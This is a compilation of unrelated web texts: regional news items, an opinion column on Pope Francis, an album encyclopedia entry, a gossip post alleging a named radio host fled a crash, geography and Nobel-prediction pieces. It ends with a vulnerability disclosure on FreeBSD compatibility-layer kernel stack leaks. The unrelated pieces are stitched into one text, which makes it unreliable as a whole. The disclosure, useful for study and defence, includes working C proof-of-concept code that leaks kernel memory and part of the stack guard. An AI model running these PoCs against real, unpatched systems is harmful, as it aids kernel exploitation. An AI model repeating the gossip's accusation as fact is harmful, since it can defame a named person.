McDade said this year's holiday parade was the first ever she can recall being canceled due to weather.
“In fact, everything I sent out said rain or shine, we're going to have the parade,” she said.
The Rotary Club posted the following on it's Facebook page:
“Regretfully, after much consideration and discussion with local safety officials, Rotary Club of Bangor has decided to CANCEL Saturday's (tomorrow's) Festival of Lights holidays parade in downtown Bangor. A forecast predicting rain, combined with freezing rain and possible icy road conditions, led organizers to put safety first and cancel the event.
“We sincerely apologize for the inconvenience and we appreciate the support of all those who had planned to be a part of this annual holiday tradition.
“We will see you in 2015!”
Also canceled was the Santa's Workshop event planned for Saturday, according to the Downtown Bangor Partnership.
The annual tree lighting, however, has been rescheduled for Dec. 10,
The National Weather Service issued a winter weather advisory Friday, indicating that precipitation was expected to start as snow Friday night then change to sleet and freezing snow by Saturday morning, creating hazardous driving conditions.
Affected areas include York, Cumberland, Oxford, Franklin, Somerset, Androscoggin, Kennebec, interior Hancock, Washington, Piscataquis and Penobscot counties.
The story of America's founding is one of faith, family and religious freedom. The church is pleased to be a partner in the ongoing efforts to engage people in their heritage in inspiring, immersive and interactive ways.
PHILADELPHIA — The Church of Jesus Christ of Latter-day Saints presented a $1.5 million gift on Thursday to the Museum of the American Revolution, scheduled to open in late 2016.
The donation pushed fundraising for the museum in Philadelphia past $100 million. The goal is $150 million.
"We have many donors to thank for their generosity and commitment to the museum and want to particularly thank our LDS friends for this gift, which has gotten us to such a milestone," said Michael Quinn, president and CEO of the museum.
Former Pennsylvania Gov. Ed Rendell also thanked the church during a press conference on Thursday in Philadelphia.
“I've always felt like the church embodies American values, values that this country was built on and still treasures,” Rendell said.
The Museum of the American Revolution is expected to feature permanent and special exhibits, including artwork and manuscripts.
The president and CEO of an LDS Church affiliate, FamilySearch International, presented the gift to the museum.
"The story of America's founding is one of faith, family and religious freedom," FamilySearch's Dennis Brimhall said. "The church is pleased to be a partner in the ongoing efforts to engage people in their heritage in inspiring, immersive and interactive ways."
"With more than 25,000 members in and around the city of Philadelphia, this support demonstrates our commitment to and interest in building our local community,” said Elder Robert B. Smith, an Area Seventy of the church's North America Northeast Area.
The museum also will feature a discovery center supported by FamilySearch.
FamilySearch is a free service provided by the LDS Church to help people connect with their ancestors. Launched 120 years ago, FamilySearch is the world's largest genealogy organization with more than 3.5 billion records available free at familysearch.org.
More than 3 million people each month use FamilySearch services and records, which are transcribed from digital copies of handwritten records from around the world.
On Wedneday, FamilySearch announced the addition of 10.7 million images to its collection, including more than 470,000 U.S. World War II draft registration cards and over 3.6 million records from New Zealand passenger lists between 1839-1973.
Users also can access the records through 4,600 family history centers in more than 130 countries, including the Family History Library in Salt Lake City.
Latter-day Saints believe families are central to life and that family relationships may continue beyond this life.
They're putting their own people in the line of fire — and doing it by the book.
The Israeli military said it has captured a Hamas manual on urban warfare — called “Introduction to the City War” — that extols the benefits of civilian deaths and openly admits that Israel tries to avoid them.
The Israel Defense Forces also said the manual — whose cover shows images of militants wielding rocket-propelled grenades and automatic weapons — crows about the propaganda value of the deaths of innocents.
“The destruction of civilian homes: This increases the hatred of the citizens toward the attackers and increases their gathering around [to support] the city defenders,” the manual said, according to the IDF.
The manual, which came from the Shuja'iya Brigade of Hamas' military wing, also explained how heavily populated urban areas — called “pockets of resistance” — make operations for the IDF difficult because Israeli soldiers try not to harm civilians.
“The soldiers and [IDF] commanders must limit their use of weapons and tactics that lead to the harm and unnecessary loss of people and [destruction of] civilian facilities,” the manual said, according to the IDF.
“It is difficult for them to get the most use out of their firearms, especially of supporting fire [e.g. artillery].”
Israel has repeatedly charged during the nearly monthlong conflict in Gaza that Hamas exploits civilians as human shields — a claim apparently borne out by the seized manual.
The IDF, while releasing two pages of the booklet, said it was significant that it came from the Shuja'iya Brigade.
“The IDF fought a major battle in the neighborhood of Shuja'iya, which had been turned into a terrorist stronghold. The discovery of this manual suggests that the destruction in Shuja'iya was always part of Hamas' plan,” the IDF said on its official blog.
Meanwhile, Israel said it withdrew the last of its ground forces from Gaza on Tuesday as part of a 72-hour ceasefire brokered by Egypt. The calm sets the stage for talks on a broader deal for a long-term truce and the rebuilding of the battered coastal territory. If the calm holds, it would be the longest lull in the fighting, which has killed nearly 1,900 Palestinians — 900 of them militants, Israel said — and 67 Israelis, all but three soldiers.
Israel said its troops had destroyed 32 cross-border tunnels built for attacks inside Israel.
Hamas and other Gaza militants fired some 3,300 rockets and mortar rounds at Israel during the hostilities, and Israeli forces destroyed another 3,000 rockets on the ground.
The last great regions of pristine wilderness – from Asia to the Amazon – are threatened by an unprecedented road-building programme financed by aggressive development banks with little interest in protecting the natural world, a leading environmental scientist has warned.
Massive infrastructure and road-building are at the heart of huge development projects around the world, justified as vital attempts at helping the poorest attain a higher standard of living.
Scientists claim that we are living in the most explosive era of road and infrastructure expansion in human history – from the plains of the Serengeti to the rainforests of Sumatra. By 2050, they estimate, there will be an additional 25 million kilometres (15.5 million miles) of new paved roads globally, enough to circle the Earth 600 times.
We'll tell you what's true. You can form your own view. From 15p €0.18 $0.18 $0.27 a day, more exclusives, analysis and extras.
Approximately 90 per cent of these new roads will be built in the developing world, and many of these will result in the first deep cuts into areas of pristine tropical rainforests to service the building of new mines and hydroelectric dams in some of the remotest places on earth.
However, experience has shown that the first roads mark the beginning of the end for the natural habitats where they are built, according to William Laurance, a distinguished research professor in environmental sustainability at James Cook University in Cairns, Australia.
“The best analogy I can use is that deforestation acts like a cancer. When the first road is built into a forested or wilderness area, deforestation tends to spread contagiously along the road route,” Professor Laurance said.
“The example I often cite is the first road to be built in the Amazon, which originally linked the city of Belem with Brasilia , the national capital,” he said. “It began as a razor-thin cut through the forest, but today has grown into a 400km-wide slash of forest destruction across the eastern Amazon.
“Because of such realities, the only real solution for limiting road impacts is to ‘avoid the first cut' – keep roads out of wilderness areas, protected areas, and the remnants of rare ecosystems,” he added.
During his time as a scientist working in the Amazon, Professor Laurance saw how road-building triggered much wider environmental destruction. In the Amazon, some 95 per cent of forest destruction has occurred within 5km of a road, and for every 1km of legal road, there were another 3km of illegal roads spreading off it, he said.

“We are living in the most dramatic era of road and infrastructure expansion in human history. The world's last surviving wildernesses – the Amazon, Congo basin, Siberia, boreal areas of Canada – are being penetrated and cut asunder by roads now. We have already crossed the Rubicon in this sense,” he said.
“To give a non-tropical example, the forests of Alberta, Canada, now have 800,000km of roads, and the road network there is increasing by 25,000km per year,” he added.
The Congo rainforest is reeling from a road-building “spree” with more than 50,000km of roads bulldozed into the rainforest, bringing loggers and poachers in their wake, he said.
In the last decade alone, this has resulted in ivory poachers killing around two thirds of the forest elephants that have lived safely among the trees for millennia.
International banks are helping to finance some of the 29 “development corridors” that will criss-cross sub-Saharan Africa, opening up many wild and inaccessible places to human pressures such as ivory smuggling, logging and the bushmeat trade.
“Yet many economists would look at these trends and applaud them,” said Professor Laurance.
“They say the developing world is simply developing and we should support this.” He cited the $60-$70 trillion to be spent on new infrastructure by the G20 nations over the next 15 years.
“This staggering sum will come from a variety of sources, such as public-private partnerships, pension funds, bilateral aid and the major development banks.
“This will be the single biggest financial transaction in human history and the environmental impacts will be Earth-shaking,” Professor Laurance said.
There are ways of minimising the impact of infrastructure development by, for instance, using existing waterways for transport rather than building the first roads, or by concentrating on road improvements in areas already settled. But he believes environmental concerns are being brushed aside in the drive to exploit natural resources.
He is particularly worried about two development banks, the new China-dominated Asian Infrastructure Investment Bank (AIIB) based in Beijing, and the Brazilian Development Bank (BNDES). Both banks allegedly operate to different environmental standards than the more traditional development banks, he claimed.
“My main concern is that the AIIB and BNDES will force the traditional lenders to loosen their environmental and social concerns in order to remain competitive,” he said.
“The BNDES has funded a range of highly damaging infrastructure projects, notably including some massive Amazonian dams that have flooded vast areas of forest and promoted a spate of associated road and power line building and deforestation,” he explained.
“Regarding the AIIB, it hasn't actually begun functioning yet but two things are clear. First, it is hugely capitalised, especially by China – already having at least half of the capitalisation of the World Bank and IMF,” he said.
“China has been notorious for placing a low priority on environmental and social concerns in its many dealings internationally.
“In such senses it tends to be agnostic –leaving these concerns to the local governments to deal with. All it cares about is getting the natural resources it desires, in whatever way is necessary.”
This year, France and Germany decided to follow the UK's lead in becoming members of the Chinese-led bank, the AIIB, which has shocked other countries, including the United States which sees the bank as a rival to the western-dominated World Bank.
A spokesman for the BNDES said it has a “series of mechanisms” designed to evaluate projects, ranging from “meticulous analysis of any social and environmental impacts in any project receiving financial support, to financing for investments that generate direct benefits to boost environmental quality and to reduce social and regional inequalities in the country”. The AIIB did not respond to a request for comment.
Critics argue that the new European members will give the AIIB credibility that it doesn't deserve. However, others have suggested that Britain and the other western nations could work on the inside trying to tighten up the bank's environmental standards – although the sheer size of the bank's development fund will undoubtedly mean more road-building in areas of pristine wilderness.
“The only way I would see a real change of tack is if nations such as the UK, Germany, France, Australia and New Zealand have the courage and influence to take a strong stand and demand social and environmental safeguards,” Professor Laurance said. “But will they?

We have reached a new level of political absurdity when the right is mad at the pope and the left wants to anoint his head with oil.
Everyone seems to have his own special version of Pope Francis. Liberals have declared him a crusader for social justice, especially regarding his comments about global inequality. Conservatives fear he just might be a commie.
To briefly recap, Pope Francis has hit two hot buttons: He has questioned the efficacy of “unfettered” free markets and has encouraged de-emphasizing the church's positions on such divisive issues as gays and abortion.
The latter message, while loving and refreshing, is more complex than an “I'm okay, you're okay” platitude. The pope never proposes changing church teachings but merely suggests that the church should be open to all. You can't minister to people if you won't let them in the door. And no one follows a wagging finger.
“Frequently we act as arbiters of grace rather than its facilitators,” Pope Francis writes. “But the church is not a tollhouse; it is . . . a place for everyone, with all their problems.”

He also makes frequent reference to the unborn but in the context of a throwaway culture that acts as though certain people don't exist or can be easily discarded, as in the unborn or the elderly.
The message relating to the financial world similarly targeted the collateral human damage of “unfettered” markets. This is by-the-book Christianity, hardly the moorings of heresy. Yet these Christian sentiments have sent some conservatives reeling to the fainting couch.
Upon reading the pope's words about greed and inequality, Rush Limbaugh threw down the word “Marxist” like an overcooked rib-eye. The pontiff's words, said the man of many words, was “just pure Marxism coming out of the mouth of the pope.”
Now seems a good time to step back and consider what so often eludes us in our rush to pontificate: Context, context, context.
Both Karl Marx and Pope Francis may have critiqued our idolatry of money as creating an “economy of exclusion and inequality,” as Francis described the global economic system in his “Evangelii Gaudium” (The Joy of the Gospel). But Marx was making an economic statement and Francis was making a theological one. Christianity is based on Christ, while Marxism advocates abolition of religion and acceptance of atheism. One receives grace and performs acts of charity; the other abjures grace and systematizes penury.
Next comes Adam Shaw, news editor for FoxNews.com and a Catholic, who wrote that the pope is like Obama — the worst invective a good conservative can hurl this side of “You're a tool of Satan!”
“Just like President Obama loved apologizing for America, Pope Francis likes to apologize for the Catholic Church, thinking that the Church is at its best when it is passive and not offending anyone's sensibilities,” Shaw wrote. Both men, he implies, “pander to enemies ” and are “professional grievance mongers.” And so on.
Pray, where does one see passivity in Pope Francis? The man is an activist, a street-worker, a foot-washer and an evangelizer. There's nothing passive or pandering about him. And it would appear that Francis is quite willing to offend sensibilities.
It is useful to remember that Jesus wasn't only a carpenter's son but also a radical who turned the tables on the status quo. Likewise Francis — a Christian right down to his sensible black leather shoes, the better to walk the walk and sneak out at night to minister to Rome's homeless.
What set off conservatives was the pope's criticism of “trickle-down” economic theory that places absolute faith in markets to be humane and fair. Conservatives argue correctly that capitalism has done more to raise millions from poverty than any other system. And they well remember the fusion of Marxism and Christianity called “liberation theology” that seeks to redistribute wealth.
But the pope never mentions redistribution. He is challenging our idolatry of money and obsession with things (I confess!), a cultural fascination that distracts us from the needy. What is the successor to St. Peter supposed to do when he sees so much suffering even in free-market societies? Quote Ayn Rand?
In a final contextual note, Francis is the pope, not the president. Like Jiminy Cricket, he is urging people to let their conscience be their guide. No one, Christian or otherwise, can escape the mirror he holds up, his eyes doubtless twinkling in anticipation of his next moonlight adventure, searching for souls in need.

2005 studio album by Little Brother
The Minstrel Show is the second studio album by hip hop trio Little Brother. It followed the critical success of their 2003 debut, The Listening. The album was highly anticipated and touted as a probable breakthrough for the group, even before its release. The title is a reference to the minstrel shows that were popular in the United States during the 19th century.
Themes [ edit ]
The album has a running concept based on a fictional television network called "UBN" (U Black Niggas Network), which is a satire of stereotypical programs and advertisements for African Americans. For example, on "Cheatin", Phonte (performing under his alter-ego "Percy Miracles"), spoofs the over-dramatic R&B sagas performed by singers such as R. Kelly and Ronald Isley. Many of the skits contain tongue-in-cheek references to black pop-culture in the United States.
Controversy [ edit ]
For many reasons, the furor surrounding The Minstrel Show overshadowed the music itself. On August 16, 2005, hip hop magazine The Source's Editor-in-Chief, Joshua "Fahiym" Ratcliffe, announced his retirement due to conflicting opinions on the rating The Minstrel Show was to receive in the next issue of the publication. According to Ratcliffe, his original rating of 4.5 (out of 5) was reduced to 4 by the magazine's Chief Brand Executive, Raymond "Benzino" Scott and CEO Dave Mays because Ratcliffe gave then-upcoming artist Young Jeezy a rating of 4. After they refused to change the rating back to 4.5 he decided to step down from his editorial position. For his part, Benzino admitted at the time of questioning, that he had yet to listen to the album for himself and had no problem with Ratcliffe's original rating.
While this may have built up anticipation for the album, another more serious obstacle reared its head when the entertainment network BET (Black Entertainment Television) refused to play the group's video for the single, "Lovin' It", allegedly because they deemed it "too intelligent".[1][2] Michael Lewellen, a publicist and program director for BET, responded, "It's not true, not in that context. BET reserves the right to show or not to show music videos of any type based on the network's own standards and decision-making processes."[3] In a portion of the video, the group lightly pokes fun at the different stylistic aspects of hip hop subgenres such as "gangsta", "backpack", "earthy" and "icy". The rest of it sees them performing to a zealous crowd.[1]
Reception [ edit ]
In contrast to the reaction of BET, Little Brother received praises from many powerful forces within the hip hop world, such as XXL magazine, who gave the album an "XL" rating and most notably, Scratch Magazine, who gave it a perfect 10 out of 10 rating. Despite all the controversy, The Minstrel Show debuted at a #56 position on the Billboard charts selling 18,000 copies in its first week out (a much lower number than expected by both fans and critics). A second official single and any further promotion of the album was abandoned by Atlantic Records, and although the group soon began recording their follow-up album, Getback, their relationship with the label drew to a close before its release.

Um, Oops? Conservative Radio Host Accused Of Hit-And-Run After Visiting Gay Bar
SO NOT COOL!!!
Conservative radio host Michael Berry, who has made anti-gay statements in the past, has been accused of being involved in a hit-and-run after visiting a local gay bar in Houston.
A bouncer at the bar identified the former Councilman after he saw Berry's hit car hit another car just moments after leaving TC's Show Bar in Houston's Montrose Distict.
Not only that, but the bouncer admitted that Berry was a frequent visitor to the popular cross-dressing “drag show.”
After he saw the two cars hit on impact, the bouncer, Tuderia Bennett, ran up to the car and got a good look at Berry sitting behind the wheel.
Managers of the bar have since turned over security camera footage over to the police, confirming that it was him on the video.
They also wrote an email that reads:
“Mr. Berry is one of those customers who have been to our establishment. The video in question that shows Mr. Berry in our establishment is in our possession. The local authorities have requested this same video and they are in possession to assist with their investigation.”
Meanwhile, Bennett has a theory as to why Berry ran from the scene of the crime and hasn't turned himself in. (Yeah, we have a pretty good idea ourselves too.) Bennett says:
“If you're going to stand up and say anti-gay things and be conservative and be Mr. Good Guy, and then when something happens that points you out and puts you in a place with the exact business that you aim to shut down, it kind of makes it seem like I need this to go away and I need it to go away quickly.”
Word.
Obviously, Berry is embarrassed and didn't know how to handle the situation probable. Well, it's out there now. You might as well turn yourself in!
The island is located above the northern tip of Newfoundland
Belle Isle (French for 'Beautiful Island') is an uninhabited island just off the coast of Labrador and north of Newfoundland at the Atlantic entrance to the Strait of Belle Isle which takes its name. Named by French explorer Jacques Cartier,[1] the island lies on the shortest shipping lane between the Great Lakes and Europe, and also on the main north–south shipping route to Hudson Bay and the Northwest Territories. The northern terminus of the International Appalachian Trail is located on Belle Isle.
Belle Isle rises to about 213 m (699 ft) at its highest point, 52 km2 (20 sq mi) in area, 16 km (9.9 mi) long and 5 km (3 mi) wide. It is nearly 24 km (15 mi) from either coast, though slightly closer to the Labrador side of the Strait of Belle Isle, and has a lighthouse (supported by flying buttresses) at both its northern and southern ends. Officially uninhabited, there is some seasonal occupation during fishing season.
Belle Isle is the northernmost peak of the Appalachian Mountains, which extend in various shapes over 3,200 km (2,000 mi) southwest to Alabama, US.
Ice patterns show that the island lies at the meeting point of two sea currents: The Labrador Current flows from the northwest, and a smaller current, driven by dominant westerly winds, flows from the southwest. Flow lines in sea ice give a sense of the movement of the ice. Ice floes embedded in the Labrador Current appear as a relatively open pattern. Sea ice with a denser pattern enters from the strait, banking against the west side of Belle Isle. Tendrils flow around capes at either end of the island, with an ice-free "shadow" on the opposite, downstream side. Eddies off the western coast in the ice patterns (indicated by curved arrows in the photo) show where the currents interact north and west of the island.

In just over a week the world will find out who has won the 109th chemistry Nobel prize. As excitement builds once more, analysts and online commentators are making their predictions on who they think has a chance of securing science's top gong, with suggestions ranging from Crispr to heterogeneous catalysis and perennial also-ran the lithium–ion battery.
Clarivate Analytics, which maintains the publication indexing platform Web of Science, has released its citation laureates, hailing discoveries in the area of C–H functionalisation, heterogeneous catalysis and perovskites as Nobel-worthy. Since 2002, the citation laureates list – which, until last year, was published by Thomson Reuters – attempts to predict winners based on analyses of citation data. Thomson Reuters successfully predicted that one of last year's laureates, Fraser Stoddart, would get the chemistry Nobel.
Clarivate has put forward US chemists John Bercaw and Robert Bergman alongside Russian researcher Georgiy Shul'pin for the chemistry prize for critical contributions to C–H functionalisation, a widely used type of reaction that replaces carbon–hydrogen with carbon–carbon or other bonds.
Chemical engineer Jens Nørskov from Stanford University, US, is another possible for the chemistry prize for his fundamental work on heterogeneous catalysis, which has led to advances in ammonia synthesis and fuel cells. Clarivate also put forward Tsutomu Miyasaka from Japan, Nam-Gyu Park from South Korea and Henry Snaith from the UK, who they suggest might be honoured for the discovery of perovskites and their use in solar cells.
A trio consisting of chemical physicist Phaedon Avouris and physicist Paul McEuen, both from the US, and Dutch physicist Cornelis Dekker has been put forward as potential winners of the physics Nobel prize for their work on carbon nanostructures. Their research concerning carbon nanotubes, graphene and nanoribbons, and their application in electronics are, however, topics that might also be regarded as worthy of a chemistry prize.
Samuel Lord, author of the Everyday scientist blog and researcher at the University of California, US, believes the chemistry Nobel might go to Jennifer Doudna, Emmanuelle Charpentier and Feng Zhang for their work on gene-editing technology Crispr. Both DNA researcher Crisanto Gutierrez and molecular biologist Alexis Verger agree, posting on Twitter that they think the Crispr developers have a shot at the chemistry prize.
The honour society Sigma Xi, who has been running a Nobel prize prediction contest on its blog, is currently asking readers to choose between their two chemistry finalist duos: lithium–ion battery inventors Stanley Whittingham and John Goodenough, or bioinorganic chemistry pioneers Harry Gray and Stephen Lippard. Lord had also considered Goodenough as a Nobel contender but thinks his recently developed ultra-efficient battery, which attracted criticism from other scientists, might be too controversial for the Nobel committee.
The chemistry Nobel prize will be revealed on 4 October, two days after the prize for physiology or medicine, and a day after the physics prize.
Chemistry World will be live blogging the announcement of the chemistry Nobel prize so we hope you'll join us again then
Analysis of stack disclosure vulnerabilities in FreeBSD compatibility layers
Introduction
Arguably one of FreeBSD's most renowned features is its compatibility layers. In particular, FreeBSD provides compatibility layers for 32-bit Linux binaries and for legacy 4.3BSD software. These are usually enabled by building a custom kernel with the COMPAT_LINUX32 and COMPAT_43 configuration options, however the Linux compatibility layer is also implemented as a separate kernel module, which can be loaded at runtime instead ( kldload linux ).
I have discovered multiple information leak vulnerabilities in the implementations of these compatibility layers, which allow an unprivileged user to leak a large amount of potentially sensitive, uninitialised stack data. These vulnerabilities have been assigned SA-16:20 and SA-16:21 by the FreeBSD Security Team. A commit reference for the patch of these bugs may be found here.
In this article I will give a quick explanation of each bug I found, along with some PoC code, and will then demonstrate the impact of this type of vulnerability by using one of the bugs to partially leak the stack guard.
All details and code excerpts for this article have been taken from FreeBSD 10.2-RELEASE (amd64), however, the vulnerabilities are present up to version 10.3 as well.
TIOCGSERIAL
The first vulnerability resides in the TIOCGSERIAL command of the Linux compatibility layer's ioctl handler for virtual terminals. This function only partially initialises contents of the lss struct before copying it to userland.
sys/compat/linux/linux_ioctl.c :
static int linux_ioctl_termio(struct thread *td, struct linux_ioctl_args *args) { struct termios bios; struct linux_termios lios; struct linux_termio lio; cap_rights_t rights; struct file *fp; int error; error = fget(td, args->fd, cap_rights_init(&rights, CAP_IOCTL), &fp); if (error != 0) return (error); switch (args->cmd & 0xffff) { ... case LINUX_TIOCGSERIAL: { struct linux_serial_struct lss; lss.type = LINUX_PORT_16550A; lss.flags = 0; lss.close_delay = 0; error = copyout(&lss, (void *)args->arg, sizeof(lss)); break; } ... } fdrop(fp, td); return (error); }
By looking at the declaration of this struct type, it is immediately obvious that there is an issue.
sys/compat/linux/linux_ioctl.c :
struct linux_serial_struct { int type; int line; int port; int irq; int flags; int xmit_fifo_size; int custom_divisor; int baud_base; unsigned short close_delay; char reserved_char[2]; int hub6; unsigned short closing_wait; unsigned short closing_wait2; int reserved[4]; };
Only the type , flags , and close_delay members of the struct are initialised before it is copied to userland; all other members will contain uninitialised stack data. In total, this command allows us to leak 50 bytes.
PoC
The following PoC code demonstrates triggering the TIOCGSERIAL bug, and displaying the leaked kernel memory; it needs to be compiled as a 32-bit Linux binary.
#include <stdio.h> #include <stdlib.h> #include <stddef.h> #include <errno.h> #include <fcntl.h> #include <sys/ioctl.h> #include <linux/serial.h> static void hexDump(const void *data, size_t size) { size_t i; for(i = 0; i < size; i++) { printf("%02hhX%c", ((char *)data)[i], (i + 1) % 16 ? ' ' : '
'); } printf("
"); } int main(void) { struct serial_struct lss; size_t leaked; int fd = open("/dev/ttyv0", 0); if(fd == -1) { perror("open"); exit(1); } int r = ioctl(fd, TIOCGSERIAL, &lss); if(r == -1) { perror("ioctl"); exit(1); } printf(" [+] Total size: %zu
", sizeof(lss)); leaked = sizeof(lss); printf(" [+] Contents:
"); hexDump(&lss, sizeof(lss)); #define initialised(member) printf("0x%02zx: initialised member `%s` (%zu)
",\ offsetof(struct serial_struct, member), #member, sizeof(lss.member));\ leaked -= sizeof(lss.member); initialised(type); initialised(flags); initialised(close_delay); printf(" [+] Total bytes leaked: %zu
", leaked); return 0; }
Sample output:
[+] Total size: 60 [+] Contents: 04 00 00 00 00 FE FF FF A0 80 5D 02 00 F8 FF FF 00 00 00 00 00 FE FF FF 7B E3 8F 80 FF FF 00 00 2E 00 00 FE FF FF 28 39 2E 00 00 FE FF FF 18 39 2E 00 00 FE FF FF 0C 00 00 00 0x00: initialised member `type` (4) 0x10: initialised member `flags` (4) 0x20: initialised member `close_delay` (2) [+] Total bytes leaked: 50
Kernel pointers are clearly contained in the contents of this leaked memory, such as 0xffffffff808fe37b .
sysinfo
The next vulnerability also affects the the Linux compatibility layer, and resides in the sysinfo system call implementation. This function only partially initialises contents of the syinfo struct before copying it to userland.
sys/compat/linux/linux_misc.c :
struct l_sysinfo { l_long uptime; /* Seconds since boot */ l_ulong loads[3]; /* 1, 5, and 15 minute load averages */ #define LINUX_SYSINFO_LOADS_SCALE 65536 l_ulong totalram; /* Total usable main memory size */ l_ulong freeram; /* Available memory size */ l_ulong sharedram; /* Amount of shared memory */ l_ulong bufferram; /* Memory used by buffers */ l_ulong totalswap; /* Total swap space size */ l_ulong freeswap; /* swap space still available */ l_ushort procs; /* Number of current processes */ l_ushort pads; l_ulong totalbig; l_ulong freebig; l_uint mem_unit; char _f[20-2*sizeof(l_long)-sizeof(l_int)]; /* padding */ }; int linux_sysinfo(struct thread *td, struct linux_sysinfo_args *args) { struct l_sysinfo sysinfo; vm_object_t object; int i, j; struct timespec ts; getnanouptime(&ts); if (ts.tv_nsec != 0) ts.tv_sec++; sysinfo.uptime = ts.tv_sec; /* Use the information from the mib to get our load averages */ for (i = 0; i < 3; i++) sysinfo.loads[i] = averunnable.ldavg[i] * LINUX_SYSINFO_LOADS_SCALE / averunnable.fscale; sysinfo.totalram = physmem * PAGE_SIZE; sysinfo.freeram = sysinfo.totalram - cnt.v_wire_count * PAGE_SIZE; sysinfo.sharedram = 0; mtx_lock(&vm_object_list_mtx); TAILQ_FOREACH(object, &vm_object_list, object_list) if (object->shadow_count > 1) sysinfo.sharedram += object->resident_page_count; mtx_unlock(&vm_object_list_mtx); sysinfo.sharedram *= PAGE_SIZE; sysinfo.bufferram = 0; swap_pager_status(&i, &j); sysinfo.totalswap = i * PAGE_SIZE; sysinfo.freeswap = (i - j) * PAGE_SIZE; sysinfo.procs = nprocs; /* The following are only present in newer Linux kernels. */ sysinfo.totalbig = 0; sysinfo.freebig = 0; sysinfo.mem_unit = 1; return (copyout(&sysinfo, args->info, sizeof(sysinfo))); }
This bug is slightly more subtle because the leaked data hides in the padding bytes of the struct. The total amount of data leaked from this system call is 10 bytes.
PoC
The following PoC code demonstrates triggering the sysinfo bug, and displaying the leaked kernel memory; it needs to be compiled as a 32-bit Linux binary.
#include <stdio.h> #include <stdlib.h> #include <sys/sysinfo.h> static void hexDump(const void *data, size_t size) { size_t i; for(i = 0; i < size; i++) { printf("%02hhX%c", ((char *)data)[i], (i + 1) % 16 ? ' ' : '
'); } printf("
"); } int main(void) { struct sysinfo info; sysinfo(&info); printf(" [+] Leaked data:
"); hexDump((((char *)&info.procs) + 2), sizeof(short)); hexDump(&info._f, sizeof(info._f)); printf(" [+] %zu bytes total
", sizeof(short) + sizeof(info._f)); return 0; }
Sample output:
[+] Leaked data: 00 00 00 A0 06 28 00 00 00 00 [+] 10 bytes total
ostat
The final bug affects the 4.3BSD compatibility layer, and resides in the cvtstat function, which is used by the ostat and ofstat system calls. This function only partially initialises contents of the ost struct before copying it to userland.
sys/kern/vfs_syscalls.c :
int ostat(td, uap) struct thread *td; register struct ostat_args /* { char *path; struct ostat *ub; } */ *uap; { struct stat sb; struct ostat osb; int error; error = kern_stat(td, uap->path, UIO_USERSPACE, &sb); if (error != 0) return (error); cvtstat(&sb, &osb); return (copyout(&osb, uap->ub, sizeof (osb))); } ... /* * Convert from an old to a new stat structure. */ void cvtstat(st, ost) struct stat *st; struct ostat *ost; { ost->st_dev = st->st_dev; ost->st_ino = st->st_ino; ost->st_mode = st->st_mode; ost->st_nlink = st->st_nlink; ost->st_uid = st->st_uid; ost->st_gid = st->st_gid; ost->st_rdev = st->st_rdev; if (st->st_size < (quad_t)1 << 32) ost->st_size = st->st_size; else ost->st_size = -2; ost->st_atim = st->st_atim; ost->st_mtim = st->st_mtim; ost->st_ctim = st->st_ctim; ost->st_blksize = st->st_blksize; ost->st_blocks = st->st_blocks; ost->st_flags = st->st_flags; ost->st_gen = st->st_gen; }
This bug leaks a total of 4 bytes in the padding of the struct.
PoC
The following PoC code demonstrates triggering the ostat bug, and displaying the leaked kernel memory; it can be compiled on FreeBSD using the default clang compiler.
#include <stdio.h> #include <unistd.h> int main(void) { char oub[88] = { 0 }; syscall(38, ".", &oub); printf(" [+] Leaked data:
"); printf("0x%02hhx 0x%02hhx
", oub[2], oub[3]); printf("0x%02hhx 0x%02hhx
", oub[18], oub[19]); return 0; }
Sample output:
[+] Leaked data: 0xee 0x0f 0x99 0x02
Leveraging contents of leaked data
The leaked memory for each vulnerability will contain different kinds of data depending on the stack frame of the previously called functions.
For example, we can demonstrate this by using the LINUX_TIOCSSERIAL command, which does nothing but copyin the user supplied struct onto the stack.
sys/compat/linux/linux_ioctl.c :
case LINUX_TIOCSSERIAL: { struct linux_serial_struct lss; error = copyin((void *)args->arg, &lss, sizeof(lss)); if (error) break; /* XXX - It really helps to have an implementation that * does nothing. NOT! */ error = 0; break; }
By using this command, and then triggering the TIOCGSERIAL bug, we can observe reminants of the memory we passed to the previous call in our leaked data.
#include <stdio.h> #include <stdlib.h> #include <stddef.h> #include <string.h> #include <errno.h> #include <fcntl.h> #include <sys/ioctl.h> #include <linux/serial.h> static void hexDump(const void *data, size_t size) { size_t i; for(i = 0; i < size; i++) { printf("%02hhX%c", ((char *)data)[i], (i + 1) % 16 ? ' ' : '
'); } printf("
"); } int main(void) { struct serial_struct lss; int fd = open("/dev/ttyv0", 0); if(fd == -1) { perror("open"); exit(1); } memset(&lss, 'a', sizeof(lss)); ioctl(fd, TIOCSSERIAL, &lss); ioctl(fd, TIOCGSERIAL, &lss); printf(" [+] Contents:
"); hexDump(&lss, sizeof(lss)); return 0; }
Sample output:
[+] Contents: 04 00 00 00 00 FE FF FF 90 C1 5D 02 00 F8 FF FF 00 00 00 00 00 FE FF FF 7B E3 8F 80 FF FF 00 00 61 61 61 61 61 61 28 59 31 00 00 FE FF FF 18 59 31 00 00 FE FF FF 61 61 61 61
Targets to leak
For most modern operating systems, these kinds of info leaks are usually used to obtain kernel addresses, which can then be used to calculate the kernel slide, and bypass kernel ASLR. However, since FreeBSD still doesn't support kernel ASLR, I will instead focus on bypassing another exploit mitigation mechanism.
We can use these bugs to attempt to leak the stack guard, which is incredibly valuable to an attacker because it can be used to enable exploitation of many kernel stack overflows which would otherwise be dismissed as being unexploitable (msdosfs_readdir springs to mind).
To leak the stack guard, we just need to identify a system call with an appropriate stack frame that lines up the offset of the stack guard with an offset which we can read later.
Depending on the exact version and architecture of FreeBSD which you target, different system calls may be suitible for each bug, however, for this article I will just focus on FreeBSD 10.2-RELEASE for amd64.
The following PoC code demonstrates leaking 2 bytes of the stack guard through the sysinfo bug by abusing the stack frame of linux_newuname ; it needs to be compiled as a 32-bit Linux binary.
#include <stdio.h> #include <stdlib.h> #include <sys/sysinfo.h> #include <sys/utsname.h> int main(void) { struct sysinfo info; uname(NULL); sysinfo(&info); printf(" [+] Partial stack guard leak: 0x%04hX
", *(short *)(((char *)&info.procs) + 2)); return 0; }
The easiest way to verify the output of the above program is to compare it to the stack guard leaked from a separate vulnerability, such as SETFKEY . However, if your system has been patched against this vulnerability, you will have to either dump the stack guard with gdb, or write a custom kernel module.
Summary
Whilst the compatibility layers are an undoubtedly useful feature of FreeBSD, you should be aware that by using them, you will always expose your system to an increased attack surface.
In this article I provided several examples of obvious info leaks I discovered in these layers, and demonstrated that their impact can be severe if an attacker has identified appropriate stack frames to leak sensitive data, like the stack guard.
